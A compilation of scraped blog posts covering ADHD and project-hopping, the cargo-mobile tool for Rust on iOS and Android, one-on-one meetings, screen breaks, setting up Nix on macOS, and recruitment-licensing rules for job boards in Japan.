<p>I don't think I'm the only one with such problems. I suspect this is an ADHD issue, but I'm not certain.</p>
<p>Once in a while, the ADHD brain finds a different type of distraction: <em>the rabbit-hole</em>.</p>
<p>Sometimes it's a topic on Wikipedia you read for a few hours, sometimes it's a series of cooking videos on YouTube you want to watch.</p>
<p>Sometimes it's a grandiose inspiration.</p>
<blockquote>
<p>I'll start a podcast like I always wanted to!</p>
</blockquote>
<blockquote>
<p>I'm going to learn piano!</p>
</blockquote>
<blockquote>
<p>I'm going to make a video game!</p>
</blockquote>
<p>The identity follows soon after:</p>
<blockquote>
<p>I am a podcaster!</p>
</blockquote>
<blockquote>
<p>I am a musician!</p>
</blockquote>
<blockquote>
<p>I am an indie game developer!</p>
</blockquote>
<p>As soon as you imagine a new identity, a previous identity evaporates.</p>
<p>The salience of the rabbit hole is such that it convinces us to adopt this new identity immediately. There are too many interesting things on Earth for us to stick to a single one. Or maybe it's just me.</p>
<h2>Solutions I'm Not Exploring</h2>
<p>In Barbara Sher's book <a href="https://www.penguinrandomhouse.com/books/593218/refuse-to-choose-by-barbara-sher/"><em>Refuse to Choose!</em></a>, she argues "Scanners" are a specific type of person who are permanently afflicted with ever changing interests. "This is who you are."</p>
<p>The author argues that some interests are only meant to exist for fleeting moments, and their subsequent abandonment is because "maybe you got what you came for?"</p>
<p>(I find it funny how she creates a new identity for people who constantly change identities.)</p>
<p>In some sense I agree with Barbara. Sometimes all I really wanted was some brief creative outlet. In another sense, I refuse to capitulate because I'm a certain "type" of person. At some point, a therapist told me writing a book was not possible for me because "it takes too long for someone like you." Heh.</p>
<p>I want to create great work. Great work takes time, effort, and overcoming gaps in motivation.</p>
<p>I think I can learn how to do this.</p>
<h2>Some Data Points</h2>
<p>I abandoned my video game project but finished my book. What was the difference?</p>
<p>Writing my book was a full-time project. I had no other job at the time. I took Steven Pressfield's advice from <a href="https://stevenpressfield.com/books/the-war-of-art/"><em>The War of Art</em></a> and treated this creative process like a full-time job. I had no side-projects while writing. I never got distracted, and never felt the need to be "disciplined".</p>
<p>Perhaps the nature of the side project is to blame? Something like "oh I don't <em>really</em> need to keep working on my video game."</p>
<p>It's hard to be objectively analyze what's behind my motivation. Is it because writing the book was <em>purpose</em> driven, while the video game was <em>identity</em> driven?</p>
<p>Maybe identity is not a great explanation?</p>
<h2>Potential Solution 1: Purpose</h2>
<p>A friend of mine argued that what I'm looking for is <em>purpose</em> in these side projects, rather than an identity. Perhaps if a project was intrinsically tied to a purpose, the identity malleability problem would become irrelevant. It seems true enough for my book.</p>
<p>I haven't spent enough time directly thinking about <em>purpose</em>. I just do things I like doing. Perhaps that's the issue?</p>
<p>I'm going to actively think about purpose rather than identity going forward and see what happens.</p>
<h2>Potential Solution 2: Doing Less Stuff</h2>
<p>I just started reading <a href="https://www.calnewport.com/books/digital-minimalism/"><em>Digital Minimalism</em></a> by Cal Newport. He argues that we spend way too much time on our phones/computers. This is a pretty straightforward point and I agree.</p>
<p>I wonder if the constant bombardment of tantalizing information on the internet makes me more likely to find some new project to pursue. If I shut myself off from complete-waste-of-time activities like checking Reddit, would I be less prone to jumping around from topic to topic?</p>
<p>I was going to try to use less technology anyway, but I'll keep track of how this affects my focus.</p>
<h2>Potential Solution 3: Discipline</h2>
<p>I've always struggled with the idea of discipline. Whenever I have really stuck to a task or project, it has always felt natural to keep going. Obstacles were challenging, but overcoming them was fun. There was no required "push" where I needed to harness discipline. </p>
<p>While not <em>every</em> task has been so simple, I never felt like I needed more discipline to finish my book. Yet I completed it in 3 months and worked on it every day. Does this mean I'm already disciplined? Or does this mean I got lucky with one project? </p>
<p>It's rare for me to consciously avoid a difficult activity, but I also don't live a robotic life. Am …</p></div></div>

        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><strong><em>The answer to “how do I use Rust on iOS and Android?”</em></strong></p>

<p>For nearly 2 years, we’ve been perfecting a tool called <a href="https://github.com/BrainiumLLC/cargo-mobile">cargo-mobile</a>. It’s a framework-agnostic tool that generates all the boilerplate of a Rust mobile project, and is packed full of handy commands for building and running on mobile devices.</p>

<p>If you’d like to follow along, installation is easy:</p>

<div><div><pre><code>cargo <span>install</span> <span>--git</span> https://github.com/BrainiumLLC/cargo-mobile
</code></pre></div></div>

<p>Note that cargo-mobile currently only works on macOS! If you shoot us a PR that adds support for Linux or Windows, we’ll shower you in heart emoji. Feel free to ask us for guidance if you’re interested!</p>

<p>Additionally, until Rust 1.49.0 is released, you can’t build for iOS unless you’re using <a href="https://github.com/BrainiumLLC/cargo-mobile#status">the current beta</a>.</p>

<p>To start a new project, you just need to run <code>cargo mobile init</code>:</p>

<figure>
    <img alt="`cargo mobile init` demo" src="https://dev.brainiumstudios.com/assets/cargo-mobile/init.svg">
</figure>

<p>Just like that, you have a version of <a href="https://bevyengine.org/">Bevy</a>’s <a href="https://github.com/bevyengine/bevy/blob/master/examples/game/breakout.rs">Breakout example</a> that can run out of the box on desktop, iOS, and Android!</p>

<p>As usual, you can use <code>cargo run</code> to run on desktop:</p>

<p><a title="`cargo run` demo" href="https://dev.brainiumstudios.com/assets/cargo-mobile/desktop.png">
    <img alt="`cargo run` demo" title="`cargo run` demo" src="https://dev.brainiumstudios.com/assets/cargo-mobile/desktop.png">
</a></p>

<p>More excitingly, it’s easy to run on iOS and Android!</p>

<h2 id="ios"><a href="#ios">iOS</a></h2>

<p>We provide a convenience command for opening your project in Xcode:</p>



<p>From there, you can build your project like you normally would in Xcode! Just hit that Play button. It’ll work on Simulator, too.</p>

<p><a title="Xcode project" href="https://dev.brainiumstudios.com/assets/cargo-mobile/xcode.png">
    <img alt="Xcode project" title="Xcode project" src="https://dev.brainiumstudios.com/assets/cargo-mobile/xcode.png">
</a></p>

<p>You can even set breakpoints!</p>

<p><a title="Xcode breakpoints" href="https://dev.brainiumstudios.com/assets/cargo-mobile/breakpoints.png">
    <img alt="Xcode breakpoints" title="Xcode breakpoints" src="https://dev.brainiumstudios.com/assets/cargo-mobile/breakpoints.png">
</a></p>

<p>If you’re not a fan of opening Xcode, you can also run directly from the command line. Be warned that the output might contain some spurious errors; we’re still improving that! Also, you can’t currently use Simulator unless you’re running from Xcode.</p>



<p>Whether you run from Xcode or the command line, you should ultimately be greeted by Breakout:</p>

<p><a title="Running on an iPhone XR" href="https://dev.brainiumstudios.com/assets/cargo-mobile/iphone.jpg">
    <img alt="Running on an iPhone XR" title="Running on an iPhone XR" src="https://dev.brainiumstudios.com/assets/cargo-mobile/iphone.jpg">
</a></p>

<p>We provide several other helpful iOS commands, which are listed in our help info:</p>



<h2 id="android"><a href="#android">Android</a></h2>

<p>Naturally, we also provide a convenience command for opening your project in Android Studio:</p>



<p>Once again, you just need to hit the Run button like you normally would.</p>

<p><a title="Android Studio project" href="https://dev.brainiumstudios.com/assets/cargo-mobile/android-studio.png">
    <img alt="Android Studio project" title="Android Studio project" src="https://dev.brainiumstudios.com/assets/cargo-mobile/android-studio.png">
</a></p>

<p>Alternatively, you can skip Android Studio and run directly from the command line:</p>



<p>Either way, it should pop up on your connected device:</p>

<p><a title="Running on a Pixel 4" href="https://dev.brainiumstudios.com/assets/cargo-mobile/pixel.jpg">
    <img alt="Running on a Pixel 4" title="Running on a Pixel 4" src="https://dev.brainiumstudios.com/assets/cargo-mobile/pixel.jpg">
</a></p>

<p>You can find more Android commands in our help info:</p>



<h2 id="going-forward"><a href="#going-forward">Going forward</a></h2>

<p>Be advised that Bevy’s mobile support is still <a href="https://bevyengine.org/news/bevy-0-3/">very new</a>, so the Breakout demo doesn’t work perfectly yet. They’re doing an amazing job nonetheless! We’ve been following their progress, and a lot of contributors worked very hard to make it happen.</p>

<p>We’d love to see PRs that add template packs for other engines and frameworks, so that cargo-mobile is convenient for anyone and everyone to use. We’d also love to show you a demo using Brainstorm, our own internal mobile-first game engine, but we’re not ready to open source it just yet!</p>

<p>If you have any questions, issues, or ideas, feel free to <a href="https://github.com/BrainiumLLC/cargo-mobile/issues">open an issue</a>!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>The foundation of great teams is built with trust and strong human connection. One on One (1:1s) give both the manager and the direct an opportunity to build this human connection. But it goes beyond that: According to Google's Project Oxygen, successful managers are more likely to have frequent and effective one-on-one with their team members.</p><p>There is no doubt that meeting frequently with each team member requires a large time investment, but 1:1s are critical. They help with identifying issues early on and also create opportunities for the manager to provide feedback, and coach team members to be more effective. </p><figure><img src="https://blog.managers.app/content/images/2020/11/image-4.png" alt="" srcset="https://blog.managers.app/content/images/size/w600/2020/11/image-4.png 600w, https://blog.managers.app/content/images/2020/11/image-4.png 786w" sizes="(min-width: 720px) 720px"></figure><h3 id="why-aren-t-1-1-meetings-utilized-efficiently">Why aren't 1:1 meetings utilized efficiently?</h3><p>The importance of 1:1 meetings are widely understood but unfortunately that does not necessarily mean 1:1s are being used effectively. Some reasons for that disconnect: </p><ul><li>Misaligned expectations between manager and direct about 1:1 meetings. Recognize that this meeting is for your direct report. Find out what this person wants out of these meetings. Asked them what they liked or disliked about past experiences with 1:1s. How do they want to be supported? </li><li>Lack of preparation. As managers we are always jumping from meeting to meeting. Too often we find ourselves sitting across from our direct and feeling guilty about not being better prepared for this important conversation. Make it a daily routine to look at your team dashboard and update topics and action items for your 1:1s.</li><li>Not collaborating with our direct throughout the week to build an agenda for our 1:1 meeting. You should not be choosing all the topics and doing all the talking. Make sure your direct understands that this is their meeting and they should prepare to discuss the topics most important to them. </li></ul><hr><h3 id="1-1-meeting-best-practices-do-these-">1:1 Meeting Best Practices: Do These! </h3><figure><img src="https://blog.managers.app/content/images/2020/11/image-12.png" alt="" srcset="https://blog.managers.app/content/images/size/w600/2020/11/image-12.png 600w, https://blog.managers.app/content/images/2020/11/image-12.png 700w"><figcaption>one on one meeting best practices</figcaption></figure><h3 id="-schedule-a-weekly-meeting-with-your-direct-">📆<em> Schedule a weekly meeting with your direct: </em></h3><p>A predictable day/hour helps you and your direct be better prepared for your 1:1. </p><h3 id="-collaborate-on-a-meeting-agenda-throughout-the-week-">📋 <em>Collaborate on a meeting agenda throughout the week:</em></h3><p>It is your direct's meeting.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-daafb516dfd9bac222bd"><div><p>Too often, we find ourselves caught up in our screens, mindlessly browsing, and for some of us, that's on top of already spending our work day on screens. We open our eyes in bed, scroll social media or news sites for a bit, get to work on our work screen(s), take """<em>breaks</em>""" during the day on our pocket screen - yes, big quotation marks here - and chill out in the evening by watching the big static screen at home, sometimes while also checking our pocket screen, because why not (spoiler: it's by design).</p><p>Here are some key points on taking mindful breaks from the digital world.</p><h2>You need quality breaks</h2><p>Your brain needs breaks to refuel. If you keep going despite the need to recharge, it can go one of two ways. In the first scenario, you will keep working, get tense, and start stumbling down the mindless work staircase, until you reach the ground and need a full 5 hours to recharge. We don't want that, because then when we're done with our day, it'll take us 5 hours of binge-watching to recover.</p><p>In the second scenario, you will be distracted and drift off without actually taking a deliberate break. You might stare at the window or watch YouTube videos, while the "I should be working" thought keeps running in the background, hindering you from an actual, deliberate, relaxing break, and making you feel guilty for your natural distraction. That means neither doing productive work nor recharging: you're robbing yourself of your own time.</p><p>Let's make another thing clear: lunch shouldn't happen in front of your computer. If your main moment of rest during the workday is to eat while your eyes are glued to a screen, you might wind up drained, unable to concentrate, and overall not nearly as productive as compared to having had a balanced day.</p><p>Your attention should be on what you're doing. If it's idle time and you want to let your mind roam, so be it. But if you're eating, exercising, reading, etc., that's where your focus should be. And if it's not... it might be good to ask yourself why. 😉</p><h2>Actually taking your break</h2><p>We often know something is good for us, but still struggle to act on it. Here are a few techniques to help you veritably press pause:</p><h3>Awareness</h3><p>Awareness is always good to practise, and there's no such thing as being too aware. Here are some cues to help you notice when you need a break:</p><ul data-rte-list="default"><li><p>Low energy level</p></li><li><p>Difficulty focusing</p></li><li><p>Grumpiness</p></li><li><p>Boredom with your task</p></li><li><p>Overwhelm</p></li></ul><p>To be clear, they can have different meanings: you might have trouble focusing for a variety of reasons, one of which is that you need some rest. Try to be mindful of your state by spotting and assessing those cues.</p><p>While listening to your inner state is always beneficial, counting on awareness alone might not be enough. The more you keep working instead of taking a break, the less mindful you're likely to be, and the more chances you have of never taking that break. Don't always trust your brain.</p><h3>Commit &amp; block time</h3><p>Committing helps you remember to take a break, and keeps you accountable towards yourself and others. It's a good first step, but don't think you'll necessarily remember when to take a break, because when you're deep into work, moving from task to meeting to task to meeting, you won't think about it. Here are a few options that you can combine:</p><ul data-rte-list="default"><li><p>Block time in your calendar</p></li><li><p>Add it to your daily to-do list</p></li><li><p>Tell someone about the break you're going to take: your co-worker, your friend, your flatmate</p></li></ul><h3>Pomodoro</h3><p>As a student, <a href="https://francescocirillo.com/pages/francesco-cirillo" target="_blank">Francesco Cirillo</a> was trying to improve his productivity and efficiency by using a tomato-shaped timer. The Pomodoro technique consists of working in blocks of 25 minutes, with 3 to 5-minute breaks in-between. Whenever the timer goes off, you are prompted to press pause on your work. Since you’ve just focused intensely for 25 minutes and are about to hop on to another work block, you are more likely to enjoy a guilt-free timeout. When you resume your task, you are also more likely to focus, since you know regular breaks are ahead. It's a virtuous circle.</p><p>I haven't used the Pomodoro technique myself, but it is widespread and versatile: try various time periods, assess how they go, and pick what works best for you.</p><h3>Anticipate the bliss</h3><p>Remind yourself of why you're taking breaks. One way to do this is to focus on the benefits, to remind yourself that you'll be <a href="https://www.sciencedaily.com/releases/2011/02/110208131529.htm" target="_blank">more focused</a>, <a href="https://ijbnpa.biomedcentral.com/articles/10.1186/s12966-016-0437-z" target="_blank">more energetic and in a better mood</a> afterwards. I think an even better way to do it is to immerse yourself in the feeling of the break. Picture yourself having that break, sipping on your tea, looking out the window, or maybe smelling the trees, feeling at peace. That's appealing, right? Make yourself look forward to it. Anticipate the bliss.</p><h2>Better breaks</h2><h3>Be mindful about it</h3><p>A break spent thoughtlessly scrolling on social media or immersed in a conversation won't restore your energy as well as a mindful break would. Mind-wandering - or daydreaming - <a href="https://greatergood.berkeley.edu/article/item/how_mind_wandering_may_be_good_for_you" target="_blank">improves your creativity and performance</a>. If possible, be in a calm environment, take a step back, reflect on your day, look at the landscape: suddenly, time slows down and clarity improves.</p><h3>Meditate</h3><p>Meditation has been shown to carry countless benefits. In <a href="https://pubmed.ncbi.nlm.nih.gov/29723001/" target="_blank">this 8-week study</a>, workers completing daily Headspace meditations reported better well-being, less distress, less job strain, and a better perception of workplace social support. When practised daily, even for short 13-minute sessions, it can <a href="https://pubmed.ncbi.nlm.nih.gov/30153464/" target="_blank">improve attention, memory, mood, and lower anxiety</a>.</p><p>Mindfulness meditation also <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6397548/" target="_blank">reduces loneliness and enhances the number of social interactions</a>, if focused on both self-monitoring and acceptance:</p><blockquote><p>"Simply bringing greater awareness to the present moment [...] was not enough to impact loneliness or social interactions; it appears critical to learn how to attend to experiences through a lens of acceptance."</p></blockquote><h3>Spend time amongst your greens</h3><p>No, not <em>those</em> greens. I'm referring to spending time in nature, which has been proven to <a href="https://depts.washington.edu/hhwb/Thm_Mental.html" target="_blank">help revive your mind from work</a>. Being in nature provides a cognitive break and helps restore your focus.</p><p>Even micro nature breaks can be beneficial. In <a href="https://www.sciencedirect.com/science/article/abs/pii/S0272494415000328" target="_blank">this research</a>, students who looked at a blooming green roof for 40 seconds had better sustained attention than those who looked at a concrete roof.</p><h3>Get moving</h3><p>Yes, you know it's good for you. You don't need to do a full workout, even light physical activity and relaxation <a href="https://journals.humankinetics.com/view/journals/jpah/12/1/article-p109.xml" target="_blank">decrease the need for recovery</a> after work. If you can do more, even 5 minutes of callisthenics <a href="https://www.sciencedirect.com/science/article/abs/pii/S2211368116301929?via%3Dihub" target="_blank">improves attention and learning</a>. Additionally, walking <a href="https://pubmed.ncbi.nlm.nih.gov/27100368/" target="_blank">improves your mood</a> and <a href="https://www.apa.org/pubs/journals/releases/xlm-a0036577.pdf" target="_blank">your creativity</a>.</p><p>Getting regular breaks during the day means you won't need 6 hours in the evening to come back to life. If you are unable to focus or are unproductive, don't force it: assess why, and get the rest you need.</p><p>Now, go take a break. An actual one, 5 full minutes at least. We've both spent enough time on screens for today. Send me a message <a href="https://twitter.com/This2ShallGrow" target="_blank">on Twitter</a> to tell me if you've done it. I'm counting on you.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <h2 id="motivation">Motivation</h2>
<p>This is the part where <a href="https://www.youtube.com/watch?v=Unzc731iCUY">Patrick Winston says</a> I need to promise something you will gain by reading this. My promise is the following: This is a very quick introduction to setup Nix on a macOS (or Linux) machine, which will get you reproducible, sandboxed environments to do your development in, as well as atomic rollbacks.<span><label for="sn-1"></label><span>This is really just what Nix promises.</span></span></p>
<p>There are many introductions to Nix, but this one aims for speed. I will be skipping over a lot of the fundamentals and only tell you what you absolutely necessary to get up and running. Nix is a large and complex system, but you can get some returns on your time investment within 15 minutes, and decide on delving in deeper later.</p>
<p>This guide is aimed at macOS, but most of it can be applied to Linux as well.</p>
<h2 id="homebrew">Homebrew?</h2>
<p>The de-facto standard package manager for macOS is <a href="https://brew.sh/">Homebrew</a>. While it is a passable solution for installing Mac apps, it has a few shortcomings, some of which can be especially problematic for developers.<span><label for="sn-2"></label><span>A lot of the same applies to the various Linux distribution package managers.</span></span></p>
<dl>
<dt>Sandboxing</dt>
<dd>Homebrew packages are for the most part installed into <code>/usr/local/bin</code>, which means they are always available to everyone. This can lead to conflicts which can require manual modification of <code>$PATH</code> to resolve. Especially programming languages tend to hit this, as some software only runs on specific versions of their language.
</dd>
<dt>Freezing</dt>
<dd>Even though Homebrew is based on git, is does not support explicitly installing specific versions of a package, or pinning the version in a lockfile.<span><label for="sn-3"></label><span><a href="https://github.com/Homebrew/homebrew-bundle/pull/552"><em>Because Homebrew doesn’t work that way.</em></a></span></span> This by extension also means that whenever you install a homebrew on a new system, you will not be able to reproduce the exact versions installed on a known good system.
</dd>
<dt>Patching</dt>
<dd>If you want to modify a package, you have to do it manually after installing, and potentially after every update. Homebrew can apply patches during the build process (via <code>brew
 edit</code>), but again, there is no declarative way of doing so.
</dd>
</dl>
<p>Both the freezing problem and the patching problem can be circumvented by maintaining <a href="https://docs.brew.sh/Taps">your own tap</a>, but this comes with a significant maintenance burden, and I would not recommend it.</p>
<p>I would like to note that you likely cannot replace Homebrew entirely by Nix, as a lot of macOS-exclusive apps are not packaged in Nixpkgs. You could probably package them yourself if you really wanted to, but this has the same problems as maintaining your own Homebrew tap.</p>
<h2 id="installing-nix">Installing Nix</h2>
<p>Before we can use it, of course we have to install Nix. I am using macOS, so I will also install nix-darwin. If you are using Linux, you can install <a href="https://github.com/nix-community/home-manager">home-manager</a> instead for a declarative system setup.<span><label for="sn-4"></label><span>You can also use home-manager on macOS, but the main benefit gained is dotfile management in Nix, which I do not consider necessary in the context of this article. More on this later.</span></span></p>
<h3 id="nix">Nix</h3>
<p>To get started, first we install the Nix package manager and language itself.</p>
<div><pre><code><span>curl</span> -L https://nixos.org/nix/install <span>&gt;</span> /tmp/install-nix.sh
<span>less</span> /tmp/install-nix.sh  # inspect the script
<span>sh</span> /tmp/install-nix.sh --darwin-use-unencrypted-nix-store-volume</code></pre></div>
<p>The extra argument is specific to newer Macs with a T2 chip. Refer to <a href="https://nixos.org/manual/nix/stable/#ch-installing-binary">the manual</a> for more details.</p>
<h3 id="nix-darwin">Nix-Darwin</h3>
<p>Next we install <a href="https://github.com/LnL7/nix-darwin">nix-darwin</a>, which is essentially a framework written in the Nix language. It establishes a declarative configuration for the whole system, which packages are installed, all the way to <a href="https://macos-defaults.com/">defaults</a>. One of my personal selling points is management of <a href="https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html">Launch Agents</a> in Nix, which is much nicer to manage than writing XML and working with <code>launchctl</code>.</p>
<div><pre><code><span>nix-build</span> https://github.com/LnL7/nix-darwin/archive/master.tar.gz -A installer
<span>./result/bin/darwin-installer</span></code></pre></div>
<p>The installer will prompt us with a few questions along the way, which do not seem to be well documented. Generally we want to respond with <code>y</code> throughout (the first one is optional).</p>
<div><pre><code><span>Would</span> you like edit the default configuration.nix before starting? [y/n]
<span>Would</span> you like to manage <span>&lt;</span>darwin<span>&gt;</span> with nix-channel? [y/n]
<span>Would</span> you like to load darwin configuration in /etc/bashrc? [y/n]
<span>Would</span> you like to create /run? [y/n]</code></pre></div>
<p>At this point we are all set. We might need to start up a new shell to load the newly installed commands.<span><label for="sn-5"></label><span>If we do not have the new commands, we might be missing the shell hook. Check out <code>/etc/static</code> for <code>bashrc</code> or <code>zshrc</code> and make sure we load the appropriate one in our shell configuration.</span></span> If everything worked, we should now have <code>darwin-rebuild</code> in our <code>$PATH</code>.</p>
<h2 id="declaring-the-system">Declaring the System</h2>
<p>The first use case we will be looking at is using Nix to setup our system as a whole.</p>
<h3 id="how-nix-works">How Nix Works</h3>
<p>I will interrupt here for a brief (and simplified) explanation of how Nix works in the first place. Essentially Nix works by building and installing software according to a set of recipes (Nix expressions) in what is called the Nix store, which is just a directory at <code>/nix</code>. To actually make the software available, it creates symbolic links to into the store in a profile, which is just another directory.<span><label for="sn-6"></label><span>It is actually symbolic links all the way down but that is not really important for now. <img src="https://nixos.org/manual/nix/stable/figures/user-environments.png"></span></span> This profile can then be added to <code>$PATH</code>, so that we can just use the software installed. The beauty of the symbolic links is that we can create many profiles which link to different sets and/or different versions of software in the store.</p>
<p>This also allows us to version profiles, and switch atomically between them, because every time we run <code>darwin-rebuild switch</code>, a new profile is created and activated. Should anything break, we can just switch back to the old profile. In practice this means running <code>darwin-rebuild --rollback</code>. We can also switch to a specific version, using <code>--list-generations</code> and <code>--switch-generation</code> if we want to rollback more than one change.</p>
<h3 id="installing-a-package">Installing a Package</h3>
<p>Before we can install a package, we need to find it first. Finding a package is as simple as running</p>

<p>Let us modify <code>$HOME/.nixpkgs/darwin-configuration.nix</code> now. If we open that file, we should find a section similar to this:</p>
<div><pre><code><span>environment.systemPackages</span> =
  [ <span>pkgs.vim</span>
  ];</code></pre></div>
<p>This is where nix-darwin declares the packages installed on the system. Go ahead and add a package to that list. Nix does not use commas to separate list items, just whitespace. The canonical package to add is <code>pkgs.ripgrep</code>, but any will do. Rebuild the system:</p>

<p>We should now have <code>rg</code> in our <code>$PATH</code>, without having to open a new shell, as <code>$PATH</code> did not actually change. The <a href="https://daiderd.com/nix-darwin/manual/index.html">nix-darwin manual</a> has a big list of configuration options that might also be interesting, but are not required now.</p>
<h3 id="fetching-updates">Fetching Updates</h3>
<p>As mentioned above, anything we build and install is controlled by our local Nix expressions in the Nix store. These are just build recipes in the Nix language, similar to Makefiles. The expressions usually pin a specific version of the software they build, and they themselves are also versioned. This means to update our packages, we need to update the expressions, which we do like so:</p>

<p>This fetches the latest versions of all channels we follow and updates our local Nix expressions accordingly. If a software definition got updated upstream, we can now rebuild it to get the updated version. Because channels are also versioned, we can even rollback channel updates if an upstream update broke for us.</p>
<p>To actually rebuild the packages according to the new definitions, we have to build a new version of our profile:</p>

<h2 id="using-nix-shell">Using nix-shell</h2>
<p>There is another way of using Nix than installing all packages system-wide. If we just want to try out a package without having to rebuild our system (and reverting afterwards), we can simply run</p>
<div><pre><code><span>nix-shell</span> -p some-package</code></pre></div>
<p>Nix will build the package in the Nix store and drop us into a shell that has access to the package. Add <code>--pure</code>, and we get a completely clean environment except for anything that we explicitly add to the shell. This can be useful if the mere existence of a system-wide piece of software is problematic.</p>
<p>If we use this method to setup a Nix environment for a specific project, we can use a <code>shell.nix</code> file to declaratively<span><label for="sn-7"></label><span>For extra declarativity, we can also pin Nixpkgs to a specific revision.</span></span> express the environment like so:</p>
<div><pre><code><span>{</span> <span>pkgs</span> ? import <span>&lt;</span>nixpkgs<span>&gt;</span> <span>{}</span> <span>}</span>:
<span>pkgs.mkShell</span> {
  <span>buildInputs</span> = with pkgs<span>;</span><span> [</span>
    python-2.6
  ];
  PYTHONDONTWRITEBYTECODE <span>=</span> <span>"1"</span>;
}</code></pre></div>
<p>This looks complicated, but this does two simple things: anything in <code>buildInputs</code> is made available to the shell, and anything else is injected as an environment variable.<span><label for="sn-8"></label><span>There are actually a few more valid options, which we can get directly <a href="https://github.com/NixOS/nixpkgs/blob/master/pkgs/build-support/mkshell/default.nix">from the source</a>.</span></span> Just calling <code>nix-shell</code> in the same directory will automatically pick up this file and execute it.</p>
<p>In this case we are simply getting an older version of Python, and also setting a related environment variable. Anyone using this configuration will have the same environment, which mirrors some of the benefits of Docker, but without the overhead of running containers.<span><label for="sn-9"></label><span>Which is especially slow on macOS due to the virtual machine required.</span></span></p>
<h2 id="how-to-debug-problems">How to Debug Problems</h2>
<p>This is the hard bit about Nix, the documentation is almost infamously sparse, and common recommendations are to either find an existing solution for your problem, or to read the Nix code involved. Because Nix includes a whole programming language, it allows users to build their own abstractions, which means that many packages have their own way of doing things.<span><label for="sn-10"></label><span>It is <a href="http://winestockwebdesign.com/Essays/Lisp_Curse.html">The LISP Curse</a> all over again. There is a fair degree of standardisation in Nix though.</span></span></p>
<p>I wish I could provide a sure way to solving all your Nix-related problems, but a lot of it comes back to pasting error messages into search engines and asking people online. Nix is not without its rough edges, and sooner or later you will run into one of them. I consider them learning opportunities, but they can be very frustrating.</p>
<h2 id="where-to-go-from-here">Where to Go From Here</h2>
<p>This is just the beginning, there are many more parts of Nix to discover. It is probably advisable to read through the <a href="https://nixos.org/guides/nix-pills/index.html">Nix Pills</a> to get a better …</p></section></div>

November 27, 2020 | https://www.tokyodev.com/2020/11/27/legally-operating-a-job-board-in-japan/ | <a href="https://web.archive.org/web/*/https://www.tokyodev.com/2020/11/27/legally-operating-a-job-board-in-japan/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>I started <a href="https://www.tokyodev.com/">tokyodev</a> as a side project, and when I first launched it, it never occurred to me that there might be legal repercussions for advertising job postings. However, in Japan, <a href="https://www.tokyodev.com/2020/10/01/recruiting-in-japan/">recruiting is a licensed industry</a>, with criminal penalties of up to a year in prison for practicing without a license, and depending on how a job board is run, it may be classified as recruiting.</p>

<p>Initially my clients were small startups, who weren't even aware of the licensing requirement. However, eventually a prospective client at a larger company was blocked by their legal team because I didn't have a license. This triggered me to investigate the implications of operating a job board in Japan with regards to recruitment licensing.</p>

<p>Fortunately, the employment security bureau has released <a href="https://www.mhlw.go.jp/www2/topics/seido/anteikyoku/minkan/">guidelines</a> that explicitly address the difference between providing a job board and recruitment. They aren't the easiest thing to read, even if you're a native Japanese speaker. I've included a rough <a href="#english">English translation</a> at the end of this article.</p>

<p>The gist of it is, because all the job opportunities on tokyodev are public, I don't solicit specific individuals to apply for jobs, and applications go directly to the companies without me doing any screening, I'm complying with the guidelines and thus don't need a license. Just to be safe, I was able to confirm directly with the employment security bureau that my interpretation is correct, and I'm operating tokyodev in a manner congruent with the guidelines. Furthermore, I was able to get some clarifications from them about some of the finer points.</p>

<p>With tokyodev, I sometimes provide companies with an email address on my domain where candidates can send an application. Applications in turn get forwarded to the company. I confirmed that's allowed, so long as I don't change the contents of the emails or screen the applications. I am allowed to filter out any spam though.</p>

<p>I also confirmed that the method of compensation is independent of whether or not I need a license. Whether I was to charge companies a flat fee to post a job, a fee upon successful hire like traditional recruiters do, or even if I was to post jobs for free, it wouldn't make a difference with regards to licensing requirements.</p>

<p>I still sometimes have companies asking me if I have a license, but since I've been able to point them to the guidelines, I've been able to move forward with them despite not having one.</p>

<p><em id="english">Translation of <a href="https://www.mhlw.go.jp/www2/topics/seido/anteikyoku/minkan/">the Japanese guidelines</a> follows. Please note that the translation was done by someone who's not an expert in the area, and so shouldn't be relied upon for more than getting an overview of the guidelines.</em></p>

<h2 id="guidelines-to-distinguish-between-providing-information-of-job-seekers-and-job-offers-and-employment-placement-on-the-internet-by-a-private-company">Guidelines to distinguish between providing information of job seekers and job offers, and employment placement on the internet by a private company</h2>

<p>Guidelines to judge whether or not an online job site run by a private company is deemed to be an “employment placement” prescribed by Article 4-1 of Employment Security Law are determined as follows. If a person is going to do a business defined as “employment placement” by these guidelines, he/she needs to be approved by Minister of Health, Labor and Welfare. Each item has a specific example.</p>

<h3 id="background">Background</h3>

<p>1. Article 4-1 of Employment Security Law defines “employment placement” as “to accept job posting and job application and to encourage employment agreement between recruiters and job seekers. Therefore, an online site which only provides information of recruiters and job seekers, and does not accept job applications nor encourage employment agreements is called “information provider” and is not deemed to be “employment placement” with need to be legitimately approved.</p>

<p>2. However, recently, providing information of recruiters and job seekers on the internet has been increasing, and some of them have been changing their roles from just being “information providers” to something more than just enabling to browse information of recruiters and job seekers. This includes enabling mutual communications between recruiters and job seekers as well as establishing a way to automatically send information that matches recruiters’ requirements and/or job seekers’ qualifications. Of course, not all of them are deemed to be an “employment placement”, but there are some cases that are difficult to determine whether or not it should be deemed to be an “employment placement”. This is why these guidelines were created.</p>

<h3 id="guidelines-to-determine-if-an-online-job-site-run-by-a-private-company-is-just-an-information-provider-or-employment-placement">Guidelines to determine if an online job site run by a private company is just an information provider, or employment placement</h3>

<p>I. These guidelines are to make clear the difference of “recruiters and job seekers’ information provider” and “employment placement” on the internet in order to secure adequate operation of the law.</p>

<p>II. In these guidelines, “providing recruiters and job seekers’ information on the internet” means that an information provider allows recruiters and job seekers to view job information (both includes information that enables people to identify individual recruiter or job seeker such as company’s name and address, job seeker’s name and address, which will be called just “information” hereafter) on its homepage.
Besides, it includes providing additional services for job seekers or recruiters, such as providing a convenient way to create and send emails for job application or recruitment.</p>

